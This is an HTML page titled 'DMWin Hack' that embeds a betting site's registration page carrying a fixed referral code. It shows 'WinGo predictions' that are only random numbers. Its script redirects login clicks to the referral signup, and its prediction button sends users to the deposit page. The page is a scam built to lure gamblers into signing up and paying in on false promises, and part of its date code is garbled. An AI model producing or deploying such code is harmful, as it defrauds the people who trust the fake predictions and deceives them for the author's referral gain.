<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DMWin Hack</title>
  <style>
    body, html { margin:0; padding:0; height:100%; overflow:hidden; background:#0d1117; font-family:Arial; color:white; }
    #main-frame { width:100%; height:100vh; border:none; }
    #prediction-widget {
      position:fixed; top:0; left:0; width:100%; background:rgba(0,0,0,0.85); padding:12px; text-align:center; z-index:9999; display:none; box-shadow:0 4px 12px rgba(0,0,0,0.6);
    }
    #pred-number { font-size:22px; font-weight:bold; padding:0 10px; }
    #get-pred-btn { background:#ff5722; border:none; color:white; padding:10px 20px; margin-left:15px; border-radius:8px; cursor:pointer; font-weight:bold; }
    #get-pred-btn:hover { background:#e64a19; }
  </style>
</head>
<body>

<!-- Prediction Widget (top fixed, WinGo khulte hi show) -->
<div id="prediction-widget">
  <strong>WinGo Prediction:</strong> 
  Period: <span id="pred-period">-----</span> | 
  Number: <span id="pred-number">?</span> 
  <button id="get-pred-btn">Get Prediction</button>
</div>

<!-- Main Site Load -->
<iframe id="main-frame" src="https://www.dmwin5.com/#/register?invitationCode=27278184971"></iframe>

<!-- Audios -->
<audio id="bypass-audio" src="bypass.mp3"></audio>
<audio id="welcome-audio" src="new_user.mp3"></audio>
<audio id="deposit-audio" src="deposit_message.mp3"></audio>

<script>
// CONFIG
const REGISTER_URL = "https://www.dmwin5.com/#/register?invitationCode=27278184971";
const DEPOSIT_URL = "dmwin5.com/#/recharge"; // ← YAHAN APNA DEPOSIT LINK DAAL DE (full URL)
const HOMEPAGE_KEYWORDS = ["home", "dashboard", "main", "lobby"]; // homepage detect

const frame = document.getElementById('main-frame');

// Prediction Functions
function getCurrentPeriod() {
  const now = new Date();
  const y = now.getFullYear();
  const m = String(now.getMonth() + 1).padStart(2, '0');
  const d = String(now.getDate()).padStart(2, '0');
  const base = `\( {y} \){m}${d}10000`;
  const minutes = now.getHours() * 60 + now.getMinutes();
  const startIndex = 9671;
  return base + (startIndex + minutes);
}

function getPrediction() {
  const rn = Math.floor(Math.random() * 10);
  const color = (rn === 0 || rn === 5) ? "violet" : (rn % 2 === 0 ? "red" : "green");
  return rn;
}

function updateWidget() {
  const period = getCurrentPeriod();
  const number = getPrediction();
  document.getElementById('pred-period').innerText = period;
  document.getElementById('pred-number').innerText = number;
}
setInterval(updateWidget, 60000);
updateWidget();

// WinGo detect & widget show + login bypass
setInterval(() => {
  try {
    const doc = frame.contentDocument || frame.contentWindow.document;
    if (!doc) return;

    // Login bypass
    const loginBtns = doc.querySelectorAll('button, a, div');
    loginBtns.forEach(el => {
      const txt = (el.innerText || '').toLowerCase();
      if (txt.includes('login') || el.classList.contains('login') || txt.includes('i have an account')) {
        if (!el.dataset.listener) {
          el.addEventListener('click', (e) => {
            e.preventDefault();
            document.getElementById('bypass-audio').play();
            setTimeout(() => {
              frame.src = REGISTER_URL;
            }, 1500);
          });
          el.dataset.listener = 'added';
        }
      }
    });

    // Welcome audio on homepage
    const url = frame.src;
    if (HOMEPAGE_KEYWORDS.some(k => url.includes(k))) {
      document.getElementById('welcome-audio').play();
    }

    // WinGo game detect → widget show
    const winGoEls = doc.querySelectorAll('button, div, a');
    winGoEls.forEach(el => {
      const txt = (el.innerText || '').toLowerCase();
      if (txt.includes('wingo') || txt.includes('game') || el.className.includes('wingo')) {
        document.getElementById('prediction-widget').style.display = 'block';
      }
    });

  } catch (e) {
    console.log("Iframe access error:", e);
  }
}, 2000);

// Get Prediction click → audio + redirect
document.getElementById('get-pred-btn').onclick = () => {
  document.getElementById('deposit-audio').play();
  setTimeout(() => {
    frame.src = DEPOSIT_URL;
  }, 1500);
};
</script>
</body>
</html>
